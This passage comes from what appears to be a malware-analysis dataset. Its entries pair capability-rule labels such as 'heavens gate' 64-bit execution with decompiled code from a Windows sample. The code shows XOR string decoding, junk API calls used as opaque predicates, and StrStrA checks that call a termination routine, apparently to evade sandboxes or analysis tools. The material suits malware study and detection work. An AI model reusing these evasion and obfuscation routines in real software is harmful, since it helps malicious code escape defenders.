{\n            *(iVar7 + iVar6) = *(&var_10h + iVar7 % var_48h) ^ (iVar7 + iVar6)[&var_30h - iVar6];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0x1c);\n    stack0xffffffd7 = stack0xffffffd7 & 0xff | 0x413e2000;\n    var_24h._3_1_ = 0x2c;\n    var_20h._0_2_ = 0x1e5c;\n    var_20h._2_1_ = 5;\n    var_20h._3_1_ = 0x5b;\n    var_1ch._0_2_ = 18999;\n    var_1ch._2_1_ = 0x25;\n    var_1ch._3_1_ = 0x22;\n    var_18h._0_1_ = 0x40;\n    var_18h._1_1_ = 0x2b;\n    var_18h._2_1_ = 0x50;\n    var_18h._3_1_ = 0x1c;\n    var_14h = 0x29;\n    var_13h = 0x32;\n    var_10h = 0x58324773;\n    var_ch._0_2_ = CONCAT11(var_ch._1_1_, 0x39);\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x13);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar8 = 0;\n    var_a0h = &var_24h - iVar7;\n    var_40h = iVar7;\n    do {\n        iVar9 = (*_sym.imp.USER32.dll_GetShellWindow)();\n        puVar12 = extraout_ECX;\n        if (iVar9 != 0xebcf96) {\n            puVar12 = iVar8 + iVar7;\n            *puVar12 = *(&var_10h + iVar8 % var_48h) ^ puVar12[&var_24h - iVar7];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0x12);\n    cVar3 = fcn.0040201f(puVar12, puVar12);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (cVar3 == '\\0') {\n        fcn.0040221b();\n    }\n    var_10h = 0x750a2603;\n    var_ch._0_2_ = CONCAT11(var_ch._1_1_, 0x38);\n    var_8h = 0x55436b42;\n    var_4h = CONCAT22(var_4h._2_2_, 0x3338);\n    uVar5 = (*pcVar2)(8, 6);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar8 = 0;\n    var_a0h = iVar7;\n    var_9ch = &var_10h - iVar7;\n    do {\n        iVar9 = (*_sym.imp.USER32.dll_GetDoubleClickTime)();\n        if (iVar9 != 0x581239) {\n            *(iVar8 + iVar7) = *(&var_8h + iVar8 % var_4ch) ^ (iVar8 + iVar7)[&var_10h - iVar7];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 5);\n    var_8h = 0x391b3d25;\n    var_4h = CONCAT22(var_4h._2_2_, 0x771d);\n    var_10h = 0x71587267;\n    var_ch._0_2_ = 0x774e;\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 7);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar8 = 0;\n    var_9ch = iVar7;\n    var_98h = &var_8h - iVar7;\n    do {\n        iVar9 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if (iVar9 != 0x1e13b0) {\n            *(iVar8 + iVar7) = *(&var_10h + iVar8 % var_4ch) ^ (iVar8 + iVar7)[&var_8h - iVar7];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 6);\n    var_10h = 0x2f0b2c12;\n    var_ch._0_2_ = CONCAT11(var_ch._1_1_, 0x61);\n    var_8h = 0x77446e44;\n    var_4h = CONCAT22(var_4h._2_2_, 0x4261);\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 6);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar8 = 0;\n    var_98h = iVar7;\n    var_94h = &var_10h - iVar7;\n    do {\n        iVar9 = (*_sym.imp.USER32.dll_CreatePopupMenu)();\n        if (iVar9 != 0xc221c3) {\n            *(iVar8 + iVar7) = *(&var_8h + iVar8 % var_4ch) ^ (iVar8 + iVar7)[&var_10h - iVar7];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 5);\n    var_10h = 0x3a39152b;\n    var_ch._0_2_ = CONCAT11(var_ch._1_1_, 0x5a);\n    var_8h = 0x6f74507a;\n    var_4h = CONCAT22(var_4h._2_2_, 0x565a);\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 6);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar8 = 0;\n    var_94h = iVar7;\n    var_90h = &var_10h - iVar7;\n    do {\n        iVar9 = (*_sym.imp.USER32.dll_CreatePopupMenu)();\n        if (iVar9 != 0x57249e) {\n            *(iVar8 + iVar7) = *(&var_8h + iVar8 % var_4ch) ^ (iVar8 + iVar7)[&var_10h - iVar7];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 5);\n    var_10h = 0x6150e1d;\n    var_ch._0_2_ = CONCAT11(var_ch._1_1_, 0x6c);\n    var_8h = 0x4f56434e;\n    var_4h = CONCAT22(var_4h._2_2_, 0x5a6c);\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 6);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar8 = 0;\n    var_90h = iVar7;\n    var_8ch = &var_10h - iVar7;\n    do {\n        iVar9 = (*_sym.imp.USER32.dll_GetFocus)();\n        if (iVar9 != 0x46b0f7) {\n            *(iVar8 + iVar7) = *(&var_8h + iVar8 % var_4ch) ^ (iVar8 + iVar7)[&var_10h - iVar7];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 5);\n    stack0xffffffd7 = stack0xffffffd7 & 0xff | 0x42c7000;\n    var_24h._3_1_ = 0x2e;\n    var_20h._0_2_ = 0x191a;\n    var_20h._2_1_ = 0x42;\n    var_20h._3_1_ = 0x7d;\n    var_1ch._0_2_ = 0x604b;\n    var_1ch._2_1_ = 9;\n    var_1ch._3_1_ = 0x56;\n    var_18h._0_1_ = 0x60;\n    var_18h._1_1_ = 0x5b;\n    var_18h._2_1_ = 0x66;\n    var_18h._3_1_ = 9;\n    var_14h = 0x62;\n    var_10h = 0x6b506239;\n    var_ch._0_2_ = CONCAT11(var_ch._1_1_, 0x56);\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x12);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar8 = 0;\n    var_8ch = iVar7;\n    var_88h = &var_24h - iVar7;\n    do {\n        iVar9 = (*_sym.imp.KERNEL32.dll_GetCommandLineA)();\n        if (iVar9 != 0x1b6a13) {\n            *(iVar8 + iVar7) = *(&var_10h + iVar8 % var_48h) ^ (iVar8 + iVar7)[&var_24h - iVar7];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0x11);\n    var_8h = 0x2c3f1e21;\n    var_4h = var_4h & 0xff000000 | 0x4a5657;\n    var_10h = 0x78714a67;\n    var_ch._0_2_ = CONCAT11(var_ch._1_1_, 0x7a);\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 8);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar8 = 0;\n    var_88h = iVar7;\n    var_44h = &var_8h - iVar7;\n    do {\n        iVar9 = (*_sym.imp.USER32.dll_CreatePopupMenu)();\n        if (iVar9 != 0xe45379) {\n            *(iVar8 + iVar7) = *(&var_10h + iVar8 % var_48h) ^ (iVar8 + iVar7)[&var_8h - iVar7];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 7);\n    var_64h = 0x3c7a0a60;\n    var_60h._0_1_ = 0x4a;\n    var_8h = 0x75344533;\n    var_4h = CONCAT22(var_4h._2_2_, 0x444a);\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 6);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar8 = 0;\n    var_44h = &var_64h - iVar7;\n    var_10h = iVar7;\n    do {\n        iVar9 = (*_sym.imp.USER32.dll_GetDesktopWindow)();\n        if (iVar9 != 0x2c36b2) {\n            *(iVar8 + iVar7) = *(&var_8h + iVar8 % var_4ch) ^ (iVar8 + iVar7)[&var_64h - iVar7];\n        }\n        pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 5);\n    *0x41e1f0 = var_a0h;\n    *0x41e1f8 = var_9ch;\n    *0x41e1fc = var_98h;\n    *0x41e200 = var_94h;\n    *0x41e204 = var_90h;\n    uVar13 = 0;\n    *0x41e208 = var_8ch;\n    *0x41e20c = var_88h;\n    *0x41e210 = iVar7;\n    do {\n        iVar7 = (*_sym.imp.SHLWAPI.dll_StrStrA)(0x41dde0, *(uVar13 + 0x41e1f0));\n        if (iVar7 != 0) {\n            fcn.0040221b();\n        }\n        uVar13 = uVar13 + 4;\n    } while (uVar13 < 0x20);\n    stack0xffffffd7 = stack0xffffffd7 & 0xff | 0x3e070700;\n    var_24h._3_1_ = 0x5d;\n    var_20h._0_2_ = 0x1325;\n    var_20h._2_1_ = 7;\n    var_20h._3_1_ = 0x35;\n    var_1ch._0_2_ = 0x1c4b;\n    var_1ch._2_1_ = 0x34;\n    var_1ch._3_1_ = 0x1c;\n    var_18h._0_1_ = 0x29;\n    var_18h._1_1_ = 0x51;\n    var_18h._2_1_ = 0x25;\n    var_18h._3_1_ = 0x3f;\n    var_14h = 0x6e;\n    var_5ch = 0x385a6e51;\n    var_58h._0_1_ = 0x4a;\n    uVar5 = (*pcVar2)(8, 0x12);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar8 = 0;\n    var_64h = iVar7;\n    var_44h = &var_24h - iVar7;\n    do {\n        iVar9 = (*_sym.imp.USER32.dll_GetCaretBlinkTime)();\n        puVar12 = extraout_ECX_00;\n        if (iVar9 != 0xef343) {\n            puVar12 = iVar8 + iVar7;\n            *puVar12 = *(&var_5ch + iVar8 % var_48h) ^ puVar12[&var_24h - iVar7];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0x11);\n    cVar3 = fcn.0040201f(puVar12, puVar12);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (cVar3 == '\\0') {\n        fcn.0040221b();\n    }\n    var_20h._0_2_ = 0x3e0f;\n    var_20h._2_1_ = 0x3e;\n    var_20h._3_1_ = 0x12;\n    var_1ch._0_2_ = 0x2b21;\n    var_1ch._2_1_ = 0x35;\n    var_1ch._3_1_ = 0x15;\n    var_18h._0_1_ = 0x23;\n    var_18h._1_1_ = 0x1e;\n    var_18h._2_1_ = 0x54;\n    var_8h = 0x664c5759;\n    var_4h = CONCAT22(var_4h._2_2_, 0x4a54);\n    uVar5 = (*pcVar2)(8, 0xc);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar8 = 0;\n    var_5ch = iVar7;\n    var_44h = &var_20h - iVar7;\n    do {\n        iVar9 = (*_sym.imp.USER32.dll_GetShellWindow)();\n        if (iVar9 != 0x960c0f) {\n            *(iVar8 + iVar7) = *(&var_8h + iVar8 % var_4ch) ^ (iVar8 + iVar7)[&var_20h - iVar7];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0xb);\n    iVar7 = (*_sym.imp.SHLWAPI.dll_StrStrA)(0x41dde0, iVar7);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar7 != 0) {\n        fcn.0040221b();\n    }\n    var_3ch = 0x1c0d0464;\n    var_38h = 0xe652404;\n    var_34h._0_1_ = 0x17;\n    var_34h._1_1_ = 5;\n    var_34h._2_1_ = 0x3a;\n    var_34h._3_1_ = 6;\n    var_30h = 0x27382445;\n    var_2ch._0_1_ = 0x35;\n    var_2ch._1_1_ = 0x11;\n    var_2ch._2_1_ = 0x6b;\n    var_2ch._3_1_ = 0x1c;\n    var_28h._0_1_ = 0x22;\n    var_28h._1_1_ = 0x26;\n    var_28h._2_1_ = 0x37;\n    stack0xffffffd7 = 0x1738400a;\n    var_24h._3_1_ = 0xb;\n    var_20h._0_2_ = 0x1726;\n    var_20h._2_1_ = 0x45;\n    var_20h._3_1_ = 0x2e;\n    var_1ch._0_2_ = 0x3c25;\n    var_1ch._3_1_ = 0;\n    var_18h._0_1_ = 0x45;\n    var_18h._1_1_ = 0x38;\n    var_18h._2_1_ = 0x22;\n    var_18h._3_1_ = 0x27;\n    var_14h = 0x3d;\n    var_13h = 0x65;\n    var_8h = 0x484b4b37;\n    var_4h = CONCAT22(var_4h._2_2_, 0x6553);\n    var_1ch._2_1_ = var_34h._1_1_;\n    uVar5 = (*pcVar2)(8, 0x2b);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar8 = 0;\n    var_44h = &var_3ch - iVar7;\n    do {\n        iVar9 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n        puVar12 = extraout_ECX_01;\n        if (iVar9 != 0x2194cf) {\n            puVar12 = iVar8 + iVar7;\n            *puVar12 = *(&var_8h + iVar8 % var_4ch) ^ puVar12[&var_3ch - iVar7];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0x2a);\n    cVar3 = fcn.0040201f(puVar12, puVar12);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (cVar3 == '\\0') {\n        fcn.0040221b();\n    }\n    var_2ch._0_1_ = 0x7a;\n    var_2ch._1_1_ = 6;\n    var_2ch._2_1_ = 5;\n    var_2ch._3_1_ = 0x43;\n    var_28h._0_1_ = 7;\n    var_28h._1_1_ = 0x62;\n    stack0xffffffd7 = 0x7d1e4403;\n    var_20h._0_2_ = 0x4700;\n    var_20h._2_1_ = 3;\n    var_20h._3_1_ = 0x79;\n    var_1ch._0_2_ = 0x1a07;\n    var_1ch._2_1_ = 0x46;\n    var_1ch._3_1_ = 0;\n    var_18h._0_1_ = 0x76;\n    var_18h._2_1_ = 7;\n    var_18h._3_1_ = 0x74;\n    var_54h = 0x7437334f;\n    var_50h._0_1_ = 0x33;\n    var_28h._2_1_ = var_2ch._2_1_;\n    var_24h._3_1_ = var_2ch._2_1_;\n    var_18h._1_1_ = var_2ch._1_1_;\n    uVar5 = (*pcVar2)(8, 0x19);\n    iVar8 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar9 = 0;\n    var_44h = &var_2ch - iVar8;\n    do {\n        iVar10 = (*_sym.imp.USER32.dll_GetCaretBlinkTime)();\n        if (iVar10 != 0x352ca2) {\n            *(iVar9 + iVar8) = *(&var_54h + iVar9 % var_48h) ^ (iVar9 + iVar8)[&var_2ch - iVar8];\n        }\n        iVar9 = iVar9 + 1;\n    } while (iVar9 < 0x18);\n    iVar9 = (*_sym.imp.SHLWAPI.dll_StrStrA)(0x41dde0, iVar8);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar9 != 0) {\n        fcn.0040221b();\n    }\n    var_2ch._0_1_ = 0x44;\n    var_2ch._1_1_ = 0x7c;\n    var_2ch._2_1_ = 0x7f;\n    var_2ch._3_1_ = 0x54;\n    var_28h._0_1_ = 0x7f;\n    var_28h._1_1_ = 0x5e;\n    var_28h._2_1_ = 0x7c;\n    stack0xffffffd7 = 0x4065587f;\n    var_24h._3_1_ = 0x7b;\n    var_20h._0_2_ = 0x5b7c;\n    var_20h._2_1_ = 0x78;\n    var_20h._3_1_ = 0x40;\n    var_1ch._0_2_ = 0x667d;\n    var_1ch._2_1_ = 0x5e;\n    var_1ch._3_1_ = 0x7b;\n    var_18h._0_1_ = 0x46;\n    var_18h._1_1_ = 0x7b;\n    var_18h._2_1_ = 0x7b;\n    var_18h._3_1_ = 0x6c;\n    var_8h = 0x6c4b4a73;\n    var_4h = CONCAT31(var_4h._1_3_, 0x48);\n    uVar5 = (*pcVar2)(8, 0x19);\n    iVar9 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar10 = 0;\n    var_54h = iVar9;\n    var_44h = &var_2ch - iVar9;\n    do {\n        iVar11 = (*_sym.imp.KERNEL32.dll_GetCommandLineA)();\n        if (iVar11 != 0xf27f57) {\n            *(iVar10 + iVar9) = *(&var_8h + iVar10 % var_48h) ^ (iVar10 + iVar9)[&var_2ch - iVar9];\n        }\n        iVar10 = iVar10 + 1;\n    } while (iVar10 < 0x18);\n    iVar9 = (*_sym.imp.SHLWAPI.dll_StrStrA)(0x41dde0, iVar9);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar9 != 0) {\n        fcn.0040221b();\n    }\n    var_2ch._0_1_ = 0x67;\n    var_2ch._1_1_ = 0x60;\n    var_2ch._2_1_ = 0x79;\n    var_2ch._3_1_ = 0x55;\n    var_28h._0_1_ = 0x75;\n    var_28h._1_1_ = 100;\n    var_28h._2_1_ = 99;\n    stack0xffffffd7 = 0x7a407a65;\n    var_24h._3_1_ = 0x7d;\n    var_20h._0_2_ = 0x6f62;\n    var_20h._2_1_ = 0x74;\n    var_20h._3_1_ = 0x58;\n    var_1ch._0_2_ = 0x6477;\n    var_1ch._2_1_ = 0x62;\n    var_1ch._3_1_ = 100;\n    var_18h._0_1_ = 0x7b;\n    var_18h._1_1_ = 0x5c;\n    var_18h._2_1_ = 0x76;\n    var_18h._3_1_ = 0x49;\n    var_8h = 0x6d4d5650;\n    var_4h = CONCAT22(var_4h._2_2_, 0x4942);\n    uVar5 = (*pcVar2)(8, 0x19);\n    iVar9 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar10 = 0;\n    var_44h = &var_2ch - iVar9;\n    do {\n        iVar11 = (*_sym.imp.USER32.dll_GetDesktopWindow)();\n        if (iVar11 != 0xbafc69) {\n            *(iVar10 + iVar9) = *(&var_8h + iVar10 % var_4ch) ^ (iVar10 + iVar9)[&var_2ch - iVar9];\n        }\n        iVar10 = iVar10 + 1;\n    } while (iVar10 < 0x18);\n    iVar11 = (*_sym.imp.SHLWAPI.dll_StrStrA)(0x41dde0, iVar9);\n    iVar10 = var_54h;\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar11 != 0) {\n        fcn.0040221b();\n    }\n    uVar5 = (*pcVar2)(0, iVar9);\n    pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n    uVar5 = (*pcVar2)(0, iVar10);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, iVar8);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, iVar7);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_5ch);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_64h);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_10h);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_88h);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_8ch);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_90h);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_94h);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_98h);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_9ch);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_a0h);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_40h);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, iVar6);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_6ch);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_74h);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, iVar14);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_7ch);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_84h);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, iVar4);\n    uVar13 = (*pcVar1)(uVar5);\n    return uVar13 & 0xffffff00;\n}\n",
        "token_count": 10106
    },
    "0040dc6c": {
        "rules": [
            "64-bit execution via heavens gate/cf627f8086064c53962fc93043360d1e"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0040dc6c(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    int32_t iVar9;\n    int32_t iVar10;\n    int32_t iVar11;\n    int32_t iVar12;\n    int32_t iVar13;\n    int32_t iVar14;\n    int32_t iVar15;\n    int32_t iVar16;\n    int32_t iVar17;\n    int32_t iVar18;\n    int32_t iVar19;\n    int32_t iVar20;\n    int32_t iVar21;\n    int32_t iVar22;\n    uint var_108h;\n    uint var_104h;\n    uint var_100h;\n    uint var_fch;\n    uint var_f8h;\n    uint var_f4h;\n    uint var_f0h;\n    uint var_ech;\n    uint var_e8h;\n    uint var_e4h;\n    uint var_e0h;\n    uint var_dch;\n    uint var_d8h;\n    uint var_d4h;\n    uint var_d0h;\n    uint var_cch;\n    int32_t var_c8h;\n    uint var_c4h;\n    int32_t var_c0h;\n    uint var_bch;\n    int32_t var_b8h;\n    uint var_b4h;\n    int32_t var_b0h;\n    uint var_ach;\n    int32_t var_a8h;\n    uint var_a4h;\n    int32_t var_a0h;\n    uint var_9ch;\n    int32_t var_98h;\n    uint var_94h;\n    int32_t var_90h;\n    uint var_8ch;\n    int32_t var_88h;\n    uint var_84h;\n    int32_t var_80h;\n    uint var_7ch;\n    int32_t var_78h;\n    uint var_74h;\n    int32_t var_70h;\n    uint var_6ch;\n    int32_t var_68h;\n    uint var_64h;\n    int32_t var_60h;\n    uint var_5ch;\n    int32_t var_58h;\n    uint var_54h;\n    int32_t var_50h;\n    uint var_4ch;\n    int32_t var_48h;\n    uint var_44h;\n    int32_t var_40h;\n    uint var_3ch;\n    int32_t var_38h;\n    int32_t var_34h;\n    uint var_30h;\n    int32_t var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_18h._0_1_ = 0x6a;\n    var_18h._1_1_ = 0x2e;\n    var_18h._2_1_ = 2;\n    var_18h._3_1_ = 0x3c;\n    var_14h._0_1_ = 0x1c;\n    var_14h._1_1_ = 0x58;\n    var_14h._2_1_ = 0x3f;\n    var_14h._3_1_ = 0x24;\n    var_10h._0_1_ = 0x1a;\n    var_10h._1_1_ = 0x16;\n    var_10h._2_1_ = 0x52;\n    var_10h._3_1_ = 0x2e;\n    var_ch._0_1_ = 0x2f;\n    var_ch._1_1_ = 0x1e;\n    var_ch._2_1_ = 0xb;\n    var_ch._3_1_ = 0x50;\n    var_8h._0_1_ = 0x3d;\n    var_8h._1_1_ = 0x28;\n    var_8h._2_1_ = 0x22;\n    var_8h._3_1_ = 0x1c;\n    var_4h._0_1_ = 0x5e;\n    var_4h._1_1_ = 0x2e;\n    var_4h._2_1_ = 0x41;\n    var_a8h = 0x4e414b39;\n    var_a4h._0_1_ = 0x79;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x18);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    var_34h = 5;\n    iVar22 = 0;\n    do {\n        iVar5 = (*_sym.imp.USER32.dll_GetCursor)();\n        if (iVar5 != 0x745e29) {\n            *(iVar22 + iVar4) = *(&var_a8h + iVar22 % var_34h) ^ (iVar22 + iVar4)[&var_18h - iVar4];\n        }\n        iVar22 = iVar22 + 1;\n    } while (iVar22 < 0x17);\n    fcn.0040d324();\n    var_20h._0_1_ = 0x12;\n    var_20h._1_1_ = 0x29;\n    var_20h._2_1_ = 0x23;\n    var_20h._3_1_ = 0x38;\n    var_1ch._0_1_ = 0x31;\n    var_1ch._1_1_ = 0x24;\n    var_1ch._2_1_ = 0x26;\n    var_1ch._3_1_ = 0x22;\n    var_18h._0_1_ = 0x32;\n    var_18h._1_1_ = 0x39;\n    var_18h._2_1_ = 0x2b;\n    var_18h._3_1_ = 0x20;\n    var_14h._0_1_ = 0x20;\n    var_14h._1_1_ = 0x3e;\n    var_14h._2_1_ = 0x1b;\n    var_14h._3_1_ = 0x1f;\n    var_10h._0_1_ = 0x2d;\n    var_10h._1_1_ = 0x26;\n    var_10h._2_1_ = 0x24;\n    var_10h._3_1_ = 0x22;\n    var_ch._0_1_ = 0x32;\n    var_ch._1_1_ = 0x39;\n    var_ch._2_1_ = 0x2b;\n    var_ch._3_1_ = 0x3b;\n    var_8h._0_1_ = 0x28;\n    var_8h._1_1_ = 0x20;\n    var_8h._2_1_ = 7;\n    var_8h._3_1_ = 0x2c;\n    var_4h._0_1_ = 0x27;\n    var_4h._1_1_ = 0x4d;\n    var_28h = 0x4b624c41;\n    var_24h._0_2_ = 0x4d42;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1f);\n    iVar22 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    var_38h = 6;\n    iVar5 = 0;\n    var_a8h = iVar22;\n    var_2ch = &var_20h - iVar22;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_GetMessagePos)();\n        if (iVar6 != 0x6f6f4) {\n            *(iVar5 + iVar22) = *(&var_28h + iVar5 % var_38h) ^ (iVar5 + iVar22)[&var_20h - iVar22];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x1e);\n    fcn.0040d324();\n    var_18h._0_1_ = 0x12;\n    var_18h._1_1_ = 0x34;\n    var_18h._2_1_ = 0x7a;\n    var_18h._3_1_ = 10;\n    var_14h._0_1_ = 0x2d;\n    var_14h._1_1_ = 0x21;\n    var_14h._2_1_ = 0xc;\n    var_14h._3_1_ = 0x34;\n    var_10h._0_1_ = 0x5b;\n    var_10h._1_1_ = 10;\n    var_10h._2_1_ = 0x3c;\n    var_10h._3_1_ = 0x33;\n    var_ch._0_1_ = 0x11;\n    var_ch._1_1_ = 0x23;\n    var_ch._2_1_ = 0x5f;\n    var_ch._3_1_ = 0x13;\n    var_8h._0_1_ = 0x27;\n    var_8h._1_1_ = 0x26;\n    var_8h._2_1_ = 0x24;\n    var_8h._3_1_ = 0x36;\n    var_4h._0_1_ = 0x53;\n    var_4h._1_1_ = 0x65;\n    var_28h = 0x65365141;\n    var_24h._0_2_ = 0x4a4e;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x17);\n    iVar22 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar5 = 0;\n    var_2ch = &var_18h - iVar22;\n    do {\n        iVar6 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n        if (iVar6 != 0xc8f3de) {\n            *(iVar5 + iVar22) = *(&var_28h + iVar5 % var_38h) ^ (iVar5 + iVar22)[&var_18h - iVar22];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x16);\n    fcn.0040d324();\n    var_1ch._0_1_ = 0x38;\n    var_1ch._1_1_ = 0x51;\n    var_1ch._2_1_ = 0x10;\n    var_1ch._3_1_ = 8;\n    var_18h._0_1_ = 0x15;\n    var_18h._1_1_ = 0x19;\n    var_18h._2_1_ = 0x51;\n    var_18h._3_1_ = 0x38;\n    var_14h._0_1_ = 0x15;\n    var_14h._1_1_ = 0x13;\n    var_14h._2_1_ = 0x3a;\n    var_14h._3_1_ = 0x41;\n    var_10h._0_1_ = 0x36;\n    var_10h._1_1_ = 0x12;\n    var_10h._2_1_ = 0x17;\n    var_10h._3_1_ = 0x3b;\n    var_ch._0_1_ = 0x46;\n    var_ch._1_1_ = 0x30;\n    var_ch._2_1_ = 0x10;\n    var_ch._3_1_ = 0x1f;\n    var_8h._0_1_ = 7;\n    var_8h._1_1_ = 0x51;\n    var_8h._2_1_ = 0x3e;\n    var_8h._3_1_ = 3;\n    var_4h._0_1_ = 0x76;\n    var_98h = 0x6659346b;\n    var_94h._0_1_ = 0x76;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1a);\n    iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar6 = 0;\n    var_2ch = &var_1ch - iVar5;\n    do {\n        iVar7 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if (iVar7 != 0x3aa6e9) {\n            *(iVar6 + iVar5) = *(&var_98h + iVar6 % var_34h) ^ (iVar6 + iVar5)[&var_1ch - iVar5];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 0x19);\n    fcn.0040d324();\n    var_1ch._0_1_ = 0x27;\n    var_1ch._1_1_ = 0xb;\n    var_1ch._2_1_ = 0x1f;\n    var_1ch._3_1_ = 0x56;\n    var_18h._0_1_ = 0x27;\n    var_18h._1_1_ = 0x1b;\n    var_18h._2_1_ = 2;\n    var_18h._3_1_ = 0x23;\n    var_14h._0_1_ = 0x5b;\n    var_14h._1_1_ = 0x3d;\n    var_14h._2_1_ = 0;\n    var_14h._3_1_ = 0xb;\n    var_10h._0_1_ = 0x2e;\n    var_10h._1_1_ = 0x71;\n    var_10h._2_1_ = 0x3a;\n    var_10h._3_1_ = 4;\n    var_ch._0_1_ = 0x1b;\n    var_ch._1_1_ = 0x3e;\n    var_ch._2_1_ = 0x68;\n    var_ch._3_1_ = 0x26;\n    var_8h._0_1_ = 0x1d;\n    